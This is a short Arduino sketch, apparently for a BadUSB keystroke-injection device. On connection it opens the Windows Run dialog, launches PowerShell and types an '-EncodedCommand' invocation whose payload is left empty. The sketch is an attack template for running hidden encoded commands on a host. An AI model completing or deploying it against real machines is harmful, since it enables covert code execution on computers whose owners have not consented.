#include "Keyboard.h"
#include "Keyboard_it_IT.h"

void setup() {
  Serial.begin(9600);
  Keyboard.begin(KeyboardLayout_it_IT);
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("powershell -EncodedCommand ");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

}

void loop() {
}